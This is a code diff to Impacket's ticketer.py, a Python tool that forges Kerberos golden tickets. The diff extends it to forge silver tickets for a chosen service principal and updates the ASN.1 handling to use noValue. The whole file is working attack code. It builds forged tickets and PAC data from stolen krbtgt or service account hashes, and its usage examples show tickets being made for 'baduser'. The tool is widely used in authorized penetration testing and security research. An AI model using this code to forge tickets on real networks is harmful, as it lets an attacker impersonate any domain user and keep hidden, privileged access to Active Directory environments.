@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-# Copyright (c) 2016 CORE Security Technologies
+# Copyright (c) 2016-2018 CORE Security Technologies
 #
 # This software is provided under under a slightly modified version
 # of the Apache Software License. See the accompanying LICENSE file
@@ -21,14 +21,14 @@
 #    (https://github.com/gentilkiwi/mimikatz)
 #
 # Examples:
-#         ./ticketer.py -nthash <krbtgt nthash> -domain-sid <your domain SID> -domain <your domain FQDN> baduser
+#         ./ticketer.py -nthash <krbtgt/service nthash> -domain-sid <your domain SID> -domain <your domain FQDN> baduser
 #
 #         will create and save a golden ticket for user 'baduser' that will be all encrypted/signed used RC4.
 #         If you specify -aesKey instead of -ntHash everything will be encrypted using AES128 or AES256
 #         (depending on the key specified). No traffic is generated against the KDC. Ticket will be saved as
 #         baduser.ccache.
 #
-#         ./ticketer.py -nthash <krbtgt nthash> -aesKey <krbtgt AES> -domain-sid <your domain SID> -domain <your domain FQDN>
+#         ./ticketer.py -nthash <krbtgt/service nthash> -aesKey <krbtgt/service AES> -domain-sid <your domain SID> -domain <your domain FQDN>
 #                       -request -user <a valid domain user> -password <valid domain user's password> baduser
 #
 #         will first authenticate against the KDC (using -user/-password) and get a TGT that will be used
@@ -37,7 +37,7 @@
 #         as baduser.ccache.
 #
 # ToDo:
-# [ ] Silver tickets still not implemented
+# [X] Silver tickets still not implemented - DONE by @machosec and fixes by @br4nsh
 # [ ] When -request is specified, we could ask for a user2user ticket and also populate the received PAC
 #
 import argparse
@@ -51,6 +51,7 @@ from time import strptime
 from binascii import unhexlify
 
 from pyasn1.codec.der import encoder, decoder
+from pyasn1.type.univ import noValue
 
 from impacket import version
 from impacket.winregistry import hexdump
@@ -59,7 +60,7 @@ from impacket.dcerpc.v5.ndr import NDRULONG
 from impacket.dcerpc.v5.samr import NULL, GROUP_MEMBERSHIP, SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, \
     SE_GROUP_ENABLED, USER_NORMAL_ACCOUNT, USER_DONT_EXPIRE_PASSWORD
 from impacket.examples import logger
-from impacket.krb5.asn1 import AS_REP, ETYPE_INFO2, AuthorizationData, EncTicketPart, EncASRepPart
+from impacket.krb5.asn1 import AS_REP, TGS_REP, ETYPE_INFO2, AuthorizationData, EncTicketPart, EncASRepPart, EncTGSRepPart
 from impacket.krb5.constants import ApplicationTagNumbers, PreAuthenticationDataTypes, EncryptionTypes, \
     PrincipalNameType, ProtocolVersionNumber, TicketFlags, encodeFlags, ChecksumTypes, AuthorizationDataType, \
     KERB_NON_KERB_CKSUM_SALT
@@ -78,6 +79,15 @@ class TICKETER:
         self.__target = target
         self.__domain = domain
         self.__options = options
+        if options.spn:
+            spn = options.spn.split('/')
+            self.__service = spn[0]
+            self.__server = spn[1]
+
+        # we are creating a golden ticket
+        else:
+            self.__service = 'krbtgt'
+            self.__server = self.__domain
 
     @staticmethod
     def getFileTime(t):
@@ -218,8 +228,10 @@ class TICKETER:
             tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
                                                                     lmhash, nthash, None,
                                                                     self.__options.dc_ip)
-
-            kdcRep = decoder.decode(tgt, asn1Spec=AS_REP())[0]
+            if self.__domain == self.__server:
+                kdcRep = decoder.decode(tgt, asn1Spec=AS_REP())[0]
+            else:
+                kdcRep = decoder.decode(tgt, asn1Spec=TGS_REP())[0]
 
             # Let's check we have all the neccesary data based on the ciphers used. Boring checks
             ticketCipher = int(kdcRep['ticket']['enc-part']['etype'])
@@ -262,21 +274,25 @@ class TICKETER:
                     'Can\'t continue')
                 return None, None
             kdcRep['cname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value
-            kdcRep['cname']['name-string'] = None
+            kdcRep['cname']['name-string'] = noValue
             kdcRep['cname']['name-string'][0] = self.__target
 
         else:
             logging.info('Creating basic skeleton ticket and PAC Infos')
-            kdcRep = AS_REP()
+            if self.__domain == self.__server:
+                kdcRep = AS_REP()
+                kdcRep['msg-type'] = ApplicationTagNumbers.AS_REP.value
+            else:
+                kdcRep = TGS_REP()
+                kdcRep['msg-type'] = ApplicationTagNumbers.TGS_REP.value
             kdcRep['pvno'] = 5
-            kdcRep['msg-type'] = ApplicationTagNumbers.AS_REP.value
             if self.__options.nthash is None:
-                kdcRep['padata'] = None
-                kdcRep['padata'][0] = None
+                kdcRep['padata'] = noValue
+                kdcRep['padata'][0] = noValue
                 kdcRep['padata'][0]['padata-type'] = PreAuthenticationDataTypes.PA_ETYPE_INFO2.value
 
                 etype2 = ETYPE_INFO2()
-                etype2[0] = None
+                etype2[0] = noValue
                 if len(self.__options.aesKey) == 64:
                     etype2[0]['etype'] = EncryptionTypes.aes256_cts_hmac_sha1_96.value
                 else:
@@ -287,23 +303,28 @@ class TICKETER:
                 kdcRep['padata'][0]['padata-value'] = encodedEtype2
 
             kdcRep['crealm'] = self.__domain.upper()
-            kdcRep['cname'] = None
+            kdcRep['cname'] = noValue
             kdcRep['cname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value
-            kdcRep['cname']['name-string'] = None
+            kdcRep['cname']['name-string'] = noValue
             kdcRep['cname']['name-string'][0] = self.__target
 
-            kdcRep['ticket'] = None
+            kdcRep['ticket'] = noValue
             kdcRep['ticket']['tkt-vno'] = ProtocolVersionNumber.pvno.value
             kdcRep['ticket']['realm'] = self.__domain.upper()
-            kdcRep['ticket']['sname'] = None
-            kdcRep['ticket']['sname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value
-            kdcRep['ticket']['sname']['name-string'] = None
-            kdcRep['ticket']['sname']['name-string'][0] = 'krbtgt'
-            kdcRep['ticket']['sname']['name-string'][1] = self.__domain.upper()
+            kdcRep['ticket']['sname'] = noValue
+            kdcRep['ticket']['sname']['name-string'] = noValue
+            kdcRep['ticket']['sname']['name-string'][0] = self.__service
 
-            kdcRep['ticket']['enc-part'] = None
+            if self.__domain == self.__server:
+                kdcRep['ticket']['sname']['name-type'] = PrincipalNameType.NT_SRV_INST.value
+                kdcRep['ticket']['sname']['name-string'][1] = self.__domain.upper()
+            else:
+                kdcRep['ticket']['sname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value
+                kdcRep['ticket']['sname']['name-string'][1] = self.__server
+
+            kdcRep['ticket']['enc-part'] = noValue
             kdcRep['ticket']['enc-part']['kvno'] = 2
-            kdcRep['enc-part'] = None
+            kdcRep['enc-part'] = noValue
             if self.__options.nthash is None:
                 if len(self.__options.aesKey) == 64:
                     kdcRep['ticket']['enc-part']['etype'] = EncryptionTypes.aes256_cts_hmac_sha1_96.value
@@ -316,7 +337,7 @@ class TICKETER:
                 kdcRep['enc-part']['etype'] = EncryptionTypes.rc4_hmac.value
 
             kdcRep['enc-part']['kvno'] = 2
-            kdcRep['enc-part']['cipher'] = None
+            kdcRep['enc-part']['cipher'] = noValue
 
         pacInfos = self.createBasicPac(kdcRep)
 
@@ -330,10 +351,11 @@ class TICKETER:
         flags.append(TicketFlags.forwardable.value)
         flags.append(TicketFlags.proxiable.value)
         flags.append(TicketFlags.renewable.value)
-        flags.append(TicketFlags.initial.value)
+        if self.__domain == self.__server: 
+            flags.append(TicketFlags.initial.value)
         flags.append(TicketFlags.pre_authent.value)
         encTicketPart['flags'] = encodeFlags(flags)
-        encTicketPart['key'] = None
+        encTicketPart['key'] = noValue
         encTicketPart['key']['keytype'] = kdcRep['ticket']['enc-part']['etype']
 
         if encTicketPart['key']['keytype'] == EncryptionTypes.aes128_cts_hmac_sha1_96.value:
@@ -344,12 +366,12 @@ class TICKETER:
             encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.letters) for _ in range(16)])
 
         encTicketPart['crealm'] = self.__domain.upper()
-        encTicketPart['cname'] = None
+        encTicketPart['cname'] = noValue
         encTicketPart['cname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value
-        encTicketPart['cname']['name-string'] = None
+        encTicketPart['cname']['name-string'] = noValue
         encTicketPart['cname']['name-string'][0] = self.__target
 
-        encTicketPart['transited'] = None
+        encTicketPart['transited'] = noValue
         encTicketPart['transited']['tr-type'] = 0
         encTicketPart['transited']['contents'] = ''
 
@@ -359,10 +381,10 @@ class TICKETER:
         ticketDuration = datetime.datetime.utcnow() + datetime.timedelta(days=int(self.__options.duration))
         encTicketPart['endtime'] = KerberosTime.to_asn1(ticketDuration)
         encTicketPart['renew-till'] = KerberosTime.to_asn1(ticketDuration)
-        encTicketPart['authorization-data'] = None
-        encTicketPart['authorization-data'][0] = None
+        encTicketPart['authorization-data'] = noValue
+        encTicketPart['authorization-data'][0] = noValue
         encTicketPart['authorization-data'][0]['ad-type'] = AuthorizationDataType.AD_IF_RELEVANT.value
-        encTicketPart['authorization-data'][0]['ad-data'] = None
+        encTicketPart['authorization-data'][0]['ad-data'] = noValue
 
         # Let's locate the KERB_VALIDATION_INFO and Checksums
         if pacInfos.has_key(PAC_LOGON_INFO):
@@ -467,30 +489,40 @@ class TICKETER:
         logging.info('\tPAC_CLIENT_INFO_TYPE')
         logging.info('\tEncTicketPart')
 
-        encASRepPart = EncASRepPart()
-        encASRepPart['key'] = None
-        encASRepPart['key']['keytype'] = encTicketPart['key']['keytype']
-        encASRepPart['key']['keyvalue'] = encTicketPart['key']['keyvalue']
-        encASRepPart['last-req'] = None
-        encASRepPart['last-req'][0] = None
-        encASRepPart['last-req'][0]['lr-type'] = 0
-        encASRepPart['last-req'][0]['lr-value'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
-        encASRepPart['nonce'] = 123456789
-        encASRepPart['key-expiration'] = KerberosTime.to_asn1(ticketDuration)
-        encASRepPart['flags'] = encodeFlags(flags)
-        encASRepPart['authtime'] = encTicketPart['authtime']
-        encASRepPart['endtime'] = encTicketPart['endtime']
-        encASRepPart['starttime'] = encTicketPart['starttime']
-        encASRepPart['renew-till'] = encTicketPart['renew-till']
-        encASRepPart['srealm'] = self.__domain.upper()
-        encASRepPart['sname'] = None
-        encASRepPart['sname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value
-        encASRepPart['sname']['name-string'] = None
-        encASRepPart['sname']['name-string'][0] = 'krbtgt'
-        encASRepPart['sname']['name-string'][1] = self.__domain.upper()
-        logging.info('\tEncAsRepPart')
+        if self.__domain == self.__server:
+            encRepPart = EncASRepPart()
+        else:
+            encRepPart = EncTGSRepPart()
 
-        return encASRepPart, encTicketPart, pacInfos
+        encRepPart['key'] = noValue
+        encRepPart['key']['keytype'] = encTicketPart['key']['keytype']
+        encRepPart['key']['keyvalue'] = encTicketPart['key']['keyvalue']
+        encRepPart['last-req'] = noValue
+        encRepPart['last-req'][0] = noValue
+        encRepPart['last-req'][0]['lr-type'] = 0
+        encRepPart['last-req'][0]['lr-value'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
+        encRepPart['nonce'] = 123456789
+        encRepPart['key-expiration'] = KerberosTime.to_asn1(ticketDuration)
+        encRepPart['flags'] = encodeFlags(flags)
+        encRepPart['authtime'] = encTicketPart['authtime']
+        encRepPart['endtime'] = encTicketPart['endtime']
+        encRepPart['starttime'] = encTicketPart['starttime']
+        encRepPart['renew-till'] = encTicketPart['renew-till']
+        encRepPart['srealm'] = self.__domain.upper()
+        encRepPart['sname'] = noValue
+        encRepPart['sname']['name-string'] = noValue
+        encRepPart['sname']['name-string'][0] = self.__service
+
+        if self.__domain == self.__server:
+            encRepPart['sname']['name-type'] = PrincipalNameType.NT_SRV_INST.value
+            encRepPart['sname']['name-string'][1] = self.__domain.upper()
+            logging.info('\tEncAsRepPart')
+        else:
+            encRepPart['sname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value
+            encRepPart['sname']['name-string'][1] = self.__server
+            logging.info('\tEncTGSRepPart')
+
+        return encRepPart, encTicketPart, pacInfos
 
     def signEncryptTicket(self, kdcRep, encASRepPart, encTicketPart, pacInfos):
         logging.info('Signing/Encrypting final ticket')
@@ -581,7 +613,7 @@ class TICKETER:
         pacType['Buffers'] = buffers + buffersTail
 
         authorizationData = AuthorizationData()
-        authorizationData[0] = None
+        authorizationData[0] = noValue
         authorizationData[0]['ad-type'] = AuthorizationDataType.AD_WIN2K_PAC.value
         authorizationData[0]['ad-data'] = str(pacType)
         authorizationData = encoder.encode(authorizationData)
@@ -638,11 +670,15 @@ class TICKETER:
 
         return encoder.encode(kdcRep), cipher, sessionKey
 
-    def saveTicket(self, tgt, sessionKey):
+    def saveTicket(self, ticket, sessionKey):
         logging.info('Saving ticket in %s' % (self.__target.replace('/', '.') + '.ccache'))
         from impacket.krb5.ccache import CCache
         ccache = CCache()
-        ccache.fromTGT(tgt, sessionKey, sessionKey)
+
+        if self.__server == self.__domain:
+            ccache.fromTGT(ticket, sessionKey, sessionKey)
+        else:
+            ccache.fromTGS(ticket, sessionKey, sessionKey)
         ccache.saveFile(self.__target.replace('/','.') + '.ccache')
 
     def run(self):
@@ -657,11 +693,11 @@ if __name__ == '__main__':
     logger.init()
     print version.BANNER
 
-    parser = argparse.ArgumentParser(add_help = True, description = "Creates a Kerberos golden/silver tickets based on "
-                                                                    "user options")
-
-    parser.add_argument('target', action='store', help='username or SPN for the newly created ticket (if \'/\' present '
-                                                       'it is assumed it\'s a SPN and a silver ticket will be created')
+    parser = argparse.ArgumentParser(add_help=True, description="Creates a Kerberos golden/silver tickets based on "
+                                                                "user options")
+    parser.add_argument('target', action='store', help='username for the newly created ticket')
+    parser.add_argument('-spn', action="store", help='SPN (service/server) of the target service the silver ticket will'
+                                                     ' be generated for. if omitted, golden ticket will be created')
     parser.add_argument('-request', action='store_true', default=False, help='Requests ticket to domain and clones it '
                         'changing only the supplied information. It requires specifying -user')
     parser.add_argument('-domain', action='store', required=True, help='the fully qualified domain name (e.g. contoso.com)')
@@ -691,12 +727,12 @@ if __name__ == '__main__':
     if len(sys.argv)==1:
         parser.print_help()
         print "\nExamples: "
-        print "\t./ticketer.py -nthash <krbtgt nthash> -domain-sid <your domain SID> -domain <your domain FQDN> baduser\n"
+        print "\t./ticketer.py -nthash <krbtgt/service nthash> -domain-sid <your domain SID> -domain <your domain FQDN> baduser\n"
         print "\twill create and save a golden ticket for user 'baduser' that will be all encrypted/signed used RC4."
         print "\tIf you specify -aesKey instead of -ntHash everything will be encrypted using AES128 or AES256"
         print "\t(depending on the key specified). No traffic is generated against the KDC. Ticket will be saved as"
         print "\tbaduser.ccache.\n"
-        print "\t./ticketer.py -nthash <krbtgt nthash> -aesKey <krbtgt AES> -domain-sid <your domain SID> -domain " \
+        print "\t./ticketer.py -nthash <krbtgt/service nthash> -aesKey <krbtgt/serivce AES> -domain-sid <your domain SID> -domain " \
               "<your domain FQDN> -request -user <a valid domain user> -password <valid domain user's password> baduser\n"
         print "\twill first authenticate against the KDC (using -user/-password) and get a TGT that will be used"
         print "\tas template for customization. Whatever encryption algorithms used on that ticket will be honored,"
@@ -710,10 +746,6 @@ if __name__ == '__main__':
         logging.getLogger().setLevel(logging.DEBUG)
     else:
         logging.getLogger().setLevel(logging.INFO)
-
-    if options.target.find('/') >=0:
-        logging.critical('Silver tickets not yet supported')
-        sys.exit(1)
 
     if options.domain is None:
         logging.critical('Domain should be specified!')
